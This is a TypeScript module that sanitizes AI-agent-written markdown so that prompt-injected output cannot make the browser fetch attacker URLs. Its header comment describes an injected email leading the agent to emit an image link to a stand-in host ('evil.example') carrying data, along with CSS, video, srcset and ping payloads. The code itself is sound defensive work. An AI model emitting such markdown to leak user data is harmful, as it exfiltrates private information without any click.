// app/lib/agent/markdown-harden.ts
//
// Cycle 79b fix rounds 1–2 (C1): model-written markdown must never make the browser request a URL
// the model chose. An injected email could have Bridget write `![](https://evil.example/p.png?d=…)`
// — or raw HTML / MDC syntax like `<style>p{background:url(…)}</style>`, `<video poster=…>`,
// `<source srcset=…>`, `**x**{style="background:url(…)"}`, `<a ping=…>` — and the data would leave
// the moment Tony looked at the reply: zero clicks, no tool call, no taint gate.
//
// vue-stream-markdown's own security pass only rewrites src/href on known tags and its renderer
// copies EVERY other attribute through, so we add our own allowlist pass (a comark `post` plugin)
// over the parsed tree:
//   - only plain-markdown tags survive; raw-HTML / MDC-component tags are dropped with their
//     content (style, link, video, svg, …) or unwrapped to their text (div, span, components);
//   - each surviving tag keeps only the attributes plain markdown produces (no style except
//     table text-align, no ping/poster/srcset/on*);
//   - an image renders only from same-origin `/api/images/…` (server-authored embeds,
//     image-embed.ts); any other image becomes its alt text.
// Code-block previewers are OFF (```html would render in an iframe). Link favicons are OFF (fetched without a click). Links stay clickable — a click is Tony's
// choice and the library confirms external links.
//
// Not done here (follow-up): an app-wide CSP `img-src`/`style-src` backstop, and the same
// hardening for MdView/MDC (documents, triage, shared docs) — see the 79b handover residuals.

import type { ComarkPlugin, LinkOptions } from 'vue-stream-markdown'

type Attrs = Record<string, unknown>
type MdNode = string | [string | null, Attrs, ...MdNode[]]

/** Path prefix an image in agent-rendered markdown may load from. */
export const AGENT_IMAGE_PREFIX = '/api/images/'

/** A same-origin `/api/images/…` path with no traversal or scheme tricks. */
export function isAllowedAgentImage(src: unknown): boolean {
  return typeof src === 'string'
    && src.startsWith(AGENT_IMAGE_PREFIX)
    && !src.includes('..')
    && !src.includes('\\')
    && !src.includes('//')
}

const TEXT_ALIGN = /^text-align:\s*(?:left|right|center);?$/
const ALERTS = new Set(['note', 'tip', 'important', 'warning', 'caution'])

/** tag → attribute → validator. Anything not listed is removed. */
const ALLOWED: Record<string, Record<string, (v: unknown) => boolean>> = (() => {
  const any = () => true
  const cls = (v: unknown) => typeof v === 'string' && /^[\w -]*$/.test(v)
  const id = (v: unknown) => typeof v === 'string' && /^[\w-]*$/.test(v)
  const base = { class: cls, id, $: any }
  const t: Record<string, Record<string, (v: unknown) => boolean>> = {}
  for (const tag of ['h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'strong', 'em', 'del', 'code', 'ul', 'li',
    'thead', 'tbody', 'tr', 'table', 'hr', 'br', 'sup', 'sub', 'section', 'kbd', 's', 'b', 'i', 'mark']) t[tag] = { ...base }
  t.ol = { ...base, start: v => /^\d+$/.test(String(v)) }
  t.a = { ...base, href: v => typeof v === 'string', title: v => typeof v === 'string' }
  t.img = { src: isAllowedAgentImage, alt: v => typeof v === 'string', title: v => typeof v === 'string', $: any }
  t.input = { ...base, type: v => v === 'checkbox', checked: any, ':checked': any, disabled: any, ':disabled': any }
  t.th = { ...base, style: v => typeof v === 'string' && TEXT_ALIGN.test(v) }
  t.td = { ...t.th }
  t.pre = { ...base, language: v => typeof v === 'string' && /^[\w+#.-]*$/.test(v), filename: v => typeof v === 'string' }
  t.blockquote = { ...base, as: v => typeof v === 'string' && ALERTS.has(v.toLowerCase()) }
  return t
})()

/** Dropped WITH their content: they render nothing useful as text and can all fetch. */
const DROP = new Set(['style', 'script', 'link', 'meta', 'base', 'iframe', 'frame', 'frameset', 'object', 'embed',
  'applet', 'svg', 'math', 'video', 'audio', 'source', 'track', 'picture', 'template', 'noscript', 'form',
  'textarea', 'select', 'button', 'canvas', 'portal', 'head', 'title'])

/** Sanitize a list of nodes; returns the replacement list (unwrapping/dropping as needed). */
export function sanitizeAgentNodes(nodes: MdNode[]): MdNode[] {
  const out: MdNode[] = []
  for (const n of nodes) {
    if (typeof n === 'string') { out.push(n); continue }
    if (!Array.isArray(n)) continue
    const [tag, attrs, ...kids] = n
    if (tag === null) continue // comment node
    const name = String(tag).toLowerCase()
    if (DROP.has(name)) continue
    const rules = ALLOWED[name]
    if (!rules) { out.push(...sanitizeAgentNodes(kids)); continue } // div/span/MDC component → its content
    if (name === 'img' && !isAllowedAgentImage(attrs?.src)) {
      const alt = typeof attrs?.alt === 'string' ? attrs.alt : ''
      if (alt) out.push(alt)
      continue
    }
    if (name === 'input' && attrs?.type !== 'checkbox') continue
    const clean: Attrs = {}
    for (const [k, v] of Object.entries(attrs ?? {})) if (rules[k]?.(v)) clean[k] = v
    out.push([name, clean, ...sanitizeAgentNodes(kids)])
  }
  return out
}

/** comark `post` plugin: sanitizes the parsed tree in place, after every parse (static and streaming). */
export const agentSanitizePlugin: ComarkPlugin = {
  name: 'mymind-agent-sanitize',
  post(state) {
    const tree = state.tree as unknown as { nodes: MdNode[] }
    tree.nodes = sanitizeAgentNodes(tree.nodes)
  }
}

/** Every prop that makes a vue-stream-markdown <Markdown> safe for model-written text. Bind it with
 *  `v-bind="agentMarkdownProps"` (MessageResponse, ReasoningContent). */
export const agentMarkdownProps: {
  hardenOptions: { allowedImagePrefixes: string[], allowDataImages: boolean }
  linkOptions: LinkOptions
  parserOptions: { plugins: ComarkPlugin[] }
  previewers: false
} = {
  hardenOptions: { allowedImagePrefixes: [AGENT_IMAGE_PREFIX], allowDataImages: false },
  linkOptions: { favicon: false },
  parserOptions: { plugins: [agentSanitizePlugin] },
  // 79b fix round 3: code-block previewers OFF. On by default, they auto-switch a ```html fence
  // into an `<iframe srcdoc sandbox="allow-scripts">` (and ```mermaid into a rendered diagram once
  // a mermaid extension exists) — the HTML lives in the code TEXT, so the tree sanitizer above
  // never sees it, and the iframe loads its sub-resources / runs fetch() with zero clicks.
  previewers: false
}
